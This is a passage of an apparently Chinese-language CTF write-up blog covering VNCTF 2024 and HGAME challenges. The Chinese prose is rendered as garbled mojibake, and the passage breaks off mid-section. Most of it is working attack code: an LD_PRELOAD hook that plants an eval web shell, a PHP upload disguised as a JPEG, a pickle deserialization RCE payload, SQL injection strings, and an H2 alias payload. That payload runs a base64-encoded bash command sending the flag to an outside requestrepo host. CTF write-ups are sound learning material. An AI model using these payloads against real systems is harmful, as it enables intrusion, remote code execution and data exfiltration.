href="https://yang1k.github.io/post/2018-suctf/">å‚è€ƒèµ„æ–™</a></p><blockquote><p>create_functionçš„åŒ¿åå‡½æ•°ä¹Ÿæ˜¯æœ‰åå­—çš„ï¼Œåå­—æ˜¯\x00lambda_%dï¼Œå…¶ä¸­%dä»£è¡¨ä»–æ˜¯å½“å‰è¿›ç¨‹ä¸­çš„ç¬¬å‡ ä¸ªåŒ¿åå‡½æ•°</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$MY</span> = <span class="hljs-title function_ invoke__">create_function</span>(<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;die(`cat flag.php`);&quot;</span>);<br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$MY</span>);<br><span class="hljs-comment">//è¾“å‡ºstring(9) &quot;(è¿™æ˜¯ä¸€ä¸ªä¸å¯è§å­—ç¬¦)lambda_1&quot;ï¼Œåé¢çš„æ•°å­—æ˜¯éšæœºå˜çš„ã€‚</span><br></code></pre></td></tr></table></figure><p>å¯ä»¥ç”¨<code>burp</code>çš„<code>intruder</code>æ¨¡å—çˆ†ç ´ï¼Œæˆ–è€…ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>url = <span class="hljs-string">&quot;http://e50c90bb-2a05-4887-8d21-139d4eaa33de.node5.buuoj.cn:81/&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">5000</span>):<br>    payload = <span class="hljs-string">&quot;\x00lambda_&#123;0&#125;&quot;</span>.<span class="hljs-built_in">format</span>(i)<br>    get_data = &#123;<span class="hljs-string">&quot;func_name&quot;</span>: payload&#125;<br>    res = requests.get(url, params=get_data, timeout=<span class="hljs-number">5</span>)<br>    time.sleep(<span class="hljs-number">0.04</span>)<br>    <span class="hljs-keyword">if</span> res.status_code == <span class="hljs-number">200</span>:<br>        <span class="hljs-built_in">print</span>(res.text)<br>        <span class="hljs-built_in">print</span>(i)<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">continue</span><br></code></pre></td></tr></table></figure><p><img src="/img/nininhanshu.png" alt="nininhanshu"></p><p>è¿™å‘¨hgameä¸€é“é¢˜éƒ½æ²¡åšå‡ºæ¥:(å°±æŠŠVNCTFçš„é¢˜æ”¾åœ¨å‰é¢äº†ï¼ŒHGAMEçš„å°±å†™äº†ä¸‹å¡ä½å‰æœ‰çš„ä¸€ç‚¹ç‚¹æ€è·¯ğŸ˜‚</p><h2 id="VNCTF-CheckIn"><a href="#VNCTF-CheckIn" class="headerlink" title="[VNCTF]CheckIn"></a>[VNCTF]CheckIn</h2><p>æ‰“ç –å—å°æ¸¸æˆï¼Œå³é”®çœ‹æºç å­˜åœ¨<code>goodGame()</code>å‡½æ•°ï¼Œé‡Œé¢æœ‰è¿™ä¹ˆä¸ªä¸œè¥¿ï¼š</p><p><img src="/img/vnctfcheckin.png" alt="vnctfcheckin"></p><p>åå…­è¿›åˆ¶è§£ç å°±è¡Œï¼š</p><p><code>VNCTF&#123;W31c0m3_t0_VNCTF_2024_g@od_J0B!!!!&#125;</code></p><h2 id="VNCTF-givenphp"><a href="#VNCTF-givenphp" class="headerlink" title="[VNCTF]givenphp"></a>[VNCTF]givenphp</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;upload&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">handleFileUpload</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;challenge&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">waf</span>();<br>    <span class="hljs-variable">$value</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;value&#x27;</span>];<br>    <span class="hljs-variable">$key</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key&#x27;</span>];<br>    <span class="hljs-variable">$func</span>=<span class="hljs-title function_ invoke__">create_function</span>(<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;putenv(&#x27;<span class="hljs-subst">$key</span>=<span class="hljs-subst">$value</span>&#x27;);&quot;</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$func</span>==<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;guess&#x27;</span>])&#123;<br>        <span class="hljs-variable">$func</span>();<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;whoami&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/\&#x27;|&quot;|%|\(|\)|;|bash/i&#x27;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key&#x27;</span>])||<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/\&#x27;|&quot;|%|\(|\)|;|bash/i&#x27;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;value&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;evil input!!!&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">handleFileUpload</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$uploadDirectory</span> = <span class="hljs-string">&#x27;/tmp/&#x27;</span>;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;error&#x27;</span>] !== UPLOAD_ERR_OK) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;æ–‡ä»¶ä¸Šä¼ å¤±è´¥ã€‚&#x27;</span>;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-variable">$fileExtension</span> = <span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;name&#x27;</span>], PATHINFO_EXTENSION);<br><br>    <span class="hljs-variable">$newFileName</span> = <span class="hljs-title function_ invoke__">uniqid</span>(<span class="hljs-string">&#x27;uploaded_file_&#x27;</span>, <span class="hljs-literal">true</span>) . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-variable">$fileExtension</span>;<br>    <span class="hljs-variable">$destination</span> = <span class="hljs-variable">$uploadDirectory</span> . <span class="hljs-variable">$newFileName</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-variable">$destination</span>)) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$destination</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;æ–‡ä»¶ç§»åŠ¨å¤±è´¥ã€‚&#x27;</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><p>æ–‡ä»¶ä¸Šä¼ +<code>putenv</code>ï¼Œ<code>LD_PRELOAD</code>åŠ«æŒ<code>whoami</code>å‘½ä»¤ã€‚<a href="https://blog.csdn.net/qq_63701832/article/details/129760495">å‚è€ƒæ–‡ç« </a>ï¼Œæ³¨æ„soæ–‡ä»¶çš„å†™æ³•ã€‚</p><p>åŠ«æŒ<code>puts</code>å‡½æ•°ï¼š<a href="https://cloud.tencent.com/developer/article/1683272">å‚è€ƒæ–‡ç« </a> <a href="https://www.cnblogs.com/gxngxngxn/p/18018284">å‚è€ƒæ–‡ç« 2</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">#æ–‡ä»¶åï¼šhook.c<br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">puts</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *message)</span> &#123;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hack you!!!&quot;</span>);<br>  system(<span class="hljs-string">&quot;echo &#x27;&lt;?php @eval($_POST[0]);?&gt;&#x27; &gt; /var/www/html/evil.php&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç„¶åç¼–è¯‘æˆ<code>.so</code>æ–‡ä»¶ï¼š</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">gcc -shared -fPIC è‡ªå®šä¹‰æ–‡ä»¶<span class="hljs-selector-class">.c</span> -o ç”Ÿæˆçš„åº“æ–‡ä»¶<span class="hljs-selector-class">.so</span><br><br>gcc -shared -fPIC hook<span class="hljs-selector-class">.c</span> -o hook<span class="hljs-selector-class">.so</span><br><br><span class="hljs-comment">//export LD_PRELOAD=$PWD/hook.so,Linuxä¸Šæµ‹è¯•çš„å‘½ä»¤</span><br></code></pre></td></tr></table></figure><p>ä¸Šä¼ (æ³¨æ„åŒ¿åå‡½æ•°çš„æ–‡ä»¶åï¼Œ<code>\x00lambda_&#123;x&#125;è¿™ç§</code>)ï¼š</p><blockquote><p>create_functionçš„åŒ¿åå‡½æ•°ä¹Ÿæ˜¯æœ‰åå­—çš„ï¼Œåå­—æ˜¯\x00lambda_%dï¼Œå…¶ä¸­%dä»£è¡¨ä»–æ˜¯å½“å‰è¿›ç¨‹ä¸­çš„ç¬¬å‡ ä¸ªåŒ¿åå‡½æ•°</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#å‚è€ƒï¼šhttps://l1nyz-tel.cc/2024/2/18/VNCTF2024-Writeup/</span><br><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://d19a0faf-ab06-4db1-85a0-806d02bdeb2f.vnctf2024.manqiu.top:80/index.php&quot;</span><br><br>data = &#123;<br>    <span class="hljs-string">&quot;upload&quot;</span>:<span class="hljs-number">1</span><br>&#125;<br>file = &#123;<br>    <span class="hljs-string">&quot;file&quot;</span>:<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;hook.so&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>)<br>&#125;<br>r = requests.post(url,data=data,files=file)<br><span class="hljs-built_in">print</span>(r.text[-<span class="hljs-number">45</span>:]) <span class="hljs-comment">#æ‹¿è·¯å¾„</span><br><br>fn = r.text[-<span class="hljs-number">45</span>:].strip()<br><br>param = &#123;<br>    <span class="hljs-string">&quot;challenge&quot;</span>:<span class="hljs-number">1</span>,<br>    <span class="hljs-string">&quot;key&quot;</span>:<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>,<br>    <span class="hljs-string">&quot;value&quot;</span>:fn,<br>    <span class="hljs-string">&quot;guess&quot;</span>:<span class="hljs-string">&#x27;\x00lambda_1&#x27;</span><br>&#125;<br>r = requests.get(url,params=param)<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure><p>ç„¶åè®¿é—®<code>evil.php</code>å³å¯<code>RCE</code>:</p><p><img src="/img/GIVENPHP.png" alt="GIVENPHP"></p><h2 id="VNCTF-Trysent"><a href="#VNCTF-Trysent" class="headerlink" title="[VNCTF]Trysent"></a>[VNCTF]Trysent</h2><p>è¿›å»å‘ç°æ˜¯è¿™ä¹ˆä¸ªä¸œè¥¿ï¼š</p><p><img src="/img/vnctftrysent1.png" alt="vnctftrysent1"></p><p>ä¸€å¼€å§‹è¿˜ä»¥ä¸ºè¦çˆ†ç ´å¯†ç å•¥çš„ï¼Œæäº†åŠå¤©ã€‚æœ€åéšä¾¿åœ¨ç½‘ä¸Šæœäº†ä¸‹<code>sentCMS</code>æ¼æ´è¿˜çœŸæœåˆ°äº†ï¼š</p><p><a href="https://blog.hanayuzu.top/articles/37dacab4.html">å‚è€ƒæ–‡ç« </a></p><p>ç®€å•è¯´å°±æ˜¯å­˜åœ¨ä»»æ„æ–‡ä»¶ä¸Šä¼ </p><p><code>payload:</code></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/user/upload/upload</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>b3fe04ce-6471-4b5f-8f81-80f06f65dd1e.vnctf2024.manqiu.top<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>PHPSESSID=7901b5229557c94bad46e16af23a3728<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>752<br><span class="hljs-attribute">Sec-Ch-Ua</span><span class="hljs-punctuation">: </span>&quot; Not;A Brand&quot;;v=&quot;99&quot;, &quot;Google Chrome&quot;;v=&quot;97&quot;, &quot;Chromium&quot;;v=&quot;97&quot;<br><span class="hljs-attribute">Sec-Ch-Ua-Mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36<br><span class="hljs-attribute">Sec-Ch-Ua-Platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryrhx2kYAMYDqoTThz<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>https://info.ziwugu.vip/<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>cors<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>empty<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>b3fe04ce-6471-4b5f-8f81-80f06f65dd1e.vnctf2024.manqiu.top/user/upload/index?name=icon&amp;type=image&amp;limit=1<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9,ja-CN;q=0.8,ja;q=0.7,en;q=0.6<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryrhx2kYAMYDqoTThz</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;id&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">WU_FILE_0</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryrhx2kYAMYDqoTThz</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;name&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">test.jpg</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryrhx2kYAMYDqoTThz</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;type&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">image/jpeg</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryrhx2kYAMYDqoTThz</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;lastModifiedDate&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">Wed Jul <span class="hljs-number">21</span> <span class="hljs-number">2021</span> <span class="hljs-number">18</span>:<span class="hljs-number">15</span>:<span class="hljs-number">25</span> GMT+<span class="hljs-number">0800</span> (-Ã½Ã†Ã¶Ã´)</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryrhx2kYAMYDqoTThz</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;size&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql"><span class="hljs-number">164264</span></span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryrhx2kYAMYDqoTThz</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;file&quot;; filename=&quot;test.php&quot;</span><br><span class="language-pgsql">Content-<span class="hljs-keyword">Type</span>: image/jpeg</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">JFIF</span><br><span class="language-pgsql">&lt;?php phpinfo();?&gt;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryrhx2kYAMYDqoTThz--</span></span><br></code></pre></td></tr></table></figure><p><img src="/img/vnctftrysent2.png" alt="vnctftrysent2"></p><p><code>phpinfo</code>é‡Œå°±æœ‰<code>flag</code>ï¼š</p><p><img src="/img/vnctftrysent3.png" alt="vnctftrysent3"></p><p><code>vnctf&#123;ced40c3e-024e-4920-865e-a301d6aa6510&#125;</code></p><h2 id="VNCTF-CutePath"><a href="#VNCTF-CutePath" class="headerlink" title="[VNCTF]CutePath"></a>[VNCTF]CutePath</h2><p><a href="https://github.com/ods-im/CuteHttpFileServer/issues/15">å‚è€ƒèµ„æ–™</a></p><p><img src="/img/vnctfcutepath1.png" alt="vnctfcutepath1"></p><p>å¯ä»¥æ„é€ ç±»ä¼¼<code>http://manqiu.top:21891/#/123/../..</code>è¿™æ ·çš„URLå®ç°ç›®å½•ç©¿è¶Šï¼š</p><p><img src="/img/cuteoath2.png" alt="cuteoath2"></p><p>ç¬¬äºŒä¸ªæ–‡ä»¶æ˜¯ç”¨æˆ·åå’Œå¯†ç çš„base64ï¼Œç›´æ¥ç™»å½•ï¼š</p><p><img src="/img/cutepath3.png" alt="cutepath3"></p><p>ä½†è¿™ä¸œè¥¿ä¸‹è½½ä¸äº†ï¼Œ<code>share</code>æ–‡ä»¶å¤¹åº•ä¸‹çš„ä¸œè¥¿æ‰èƒ½ä¸‹è½½ã€‚ä¸è¿‡è¿™é‡Œå­˜åœ¨ä¸€ä¸ªé‡å‘½åçš„åŠŸèƒ½ï¼š</p><p><img src="/img/cutepath4.png" alt="cutepath4"></p><p>åˆ©ç”¨é‡å‘½åå®ç°ç›®å½•ç©¿è¶Šè¿›è¡Œä»»æ„æ–‡ä»¶è¯»å–ã€‚</p><p>æˆ–è€…åœ¨è®¿é—®ç½‘ç«™æ—¶æŠ“åŒ…å¯ä»¥å‘ç°è¿™ä¹ˆä¸ªä¸œè¥¿ï¼Œä¹Ÿå¯ä»¥å®ç°ç›®å½•ç©¿è¶Šè¯»æ–‡ä»¶ï¼š</p><p><img src="/img/cutepath1.png" alt="cutepath1"></p><h2 id="HGAME-week2-myflask"><a href="#HGAME-week2-myflask" class="headerlink" title="[HGAME-week2]myflask"></a>[HGAME-week2]myflask</h2><p>é¢˜ç›®ä¸å‡ºç½‘æ‰€ä»¥ä¹‹å‰ç”¨çš„åå¼¹shellæ²¡æ³•åšï¼Œç›´æ¥è¯»å°±è¡Œï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> base64<br> <br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> (<span class="hljs-built_in">eval</span>, (<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;</span>,))<br>    <br>a = A()<br>a = pickle.dumps(a)<br><span class="hljs-built_in">print</span>(base64.b64encode(a))<br></code></pre></td></tr></table></figure><h2 id="HGAME-week2-search4member"><a href="#HGAME-week2-search4member" class="headerlink" title="[HGAME-week2]search4member"></a>[HGAME-week2]search4member</h2><p><a href="https://blog.csdn.net/Jayjay___/article/details/136117054">å‚è€ƒæ–‡ç« </a></p><p>å­˜åœ¨<code>sql</code>æ³¨å…¥ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (keyword != <span class="hljs-literal">null</span> &amp; !keyword.equals(<span class="hljs-string">&quot;&quot;</span>)) &#123;<br>  <span class="hljs-type">String</span> <span class="hljs-variable">sql</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;SELECT * FROM member WHERE intro LIKE &#x27;%&quot;</span> + keyword + <span class="hljs-string">&quot;%&#x27;;&quot;</span>;<br></code></pre></td></tr></table></figure><p>æ‰€ä»¥æ„é€ ç±»ä¼¼<code>å…³é”®å­—%&#39;;--+</code>æµ‹è¯•ï¼š</p><p><img src="/img/searach4number1.png" alt="searach4number1"></p><p>è·å–æ•°æ®åº“åï¼š</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">?keyword=å“ˆå“ˆå“ˆ%&#x27; <span class="hljs-keyword">and</span> <span class="hljs-number">1</span>&gt;<span class="hljs-number">2</span> union <span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,database();<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p><img src="/img/search4number2.png" alt="search4number2"></p><p>æ•°æ®åº“åä¸º<code>H2</code>ï¼Œçˆ†è¡¨ï¼š</p><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs q">å“ˆå“ˆå“ˆ%&#x27; <span class="hljs-built_in">and</span> <span class="hljs-number">1</span>&gt;<span class="hljs-number">2</span> <span class="hljs-built_in">union</span> SELECT <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-built_in">tables</span> <span class="hljs-built_in">where</span> table_schema=&#x27;H2&#x27;;--+<br><span class="hljs-comment">//nullï¼Œç©ºçš„</span><br></code></pre></td></tr></table></figure><p><a href="https://www.cnblogs.com/shineman-zhang/articles/16753095.html">å‚è€ƒæ–‡ç« </a></p><p>ä¸»è¦å°±æ˜¯å¯ä»¥åˆ©ç”¨<code>CREATE ALIAS</code>è¿™ä¸œè¥¿å»åˆ›å»ºä¸€ä¸ªå‡½æ•°åˆ«åç„¶åé€šè¿‡è°ƒç”¨è¿™ä¸ªå‡½æ•°å»æ‰§è¡Œå‘½ä»¤ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> ALIAS <span class="hljs-keyword">EXEC</span> <span class="hljs-keyword">AS</span> &quot;String shellexec(String cmd) throws java.io.IOException &#123; java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream());  if (s.hasNext()) &#123;return s.next();&#125; throw new IllegalArgumentException();&#125;&quot;;<br><span class="hljs-keyword">CALL</span> <span class="hljs-keyword">EXEC</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>);<br></code></pre></td></tr></table></figure><p>æ‰€ä»¥ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs SQL">SJTU<span class="hljs-operator">%</span><span class="hljs-string">&#x27;;CREATE ALIAS EXEC AS &#x27;</span>String shellexec(String cmd) throws java.io.IOException &#123; java.util.Scanner s <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> java.util.Scanner(Runtime.getRuntime().<span class="hljs-keyword">exec</span>(cmd).getInputStream());  if (s.hasNext()) &#123;<span class="hljs-keyword">return</span> s.next();&#125; throw <span class="hljs-keyword">new</span> IllegalArgumentException();&#125;<span class="hljs-string">&#x27;;CALL SJTU%&#x27;</span>;<span class="hljs-keyword">CALL</span> <span class="hljs-keyword">EXEC</span>(<span class="hljs-string">&#x27;bash -c &#123;echo,Y3VybCBgY2F0IC9mbGFnYC50c2NmNWIzZC5yZXF1ZXN0cmVwby5jb20=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;</span>);<span class="hljs-comment">--+</span><br><span class="hljs-operator">/</span><span class="hljs-operator">/</span>curl `cat <span class="hljs-operator">/</span>flag`.tscf5b3d.requestrepo.com<br></code></pre></td></tr></table></figure><p>å®šä¹‰å‡½æ•°çš„æ—¶å€™ä¸ç”¨å•å¼•å·åŒ…è£¹ç”¨ç•Œå®šç¬¦<code>$$</code>åŒ…è£¹ä¹Ÿè¡Œã€‚</p><h2 id="HGAME-week3-WebVPN"><a href="#HGAME-week3-WebVPN" class="headerlink" title="[HGAME-week3]WebVPN"></a>[HGAME-week3]WebVPN</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 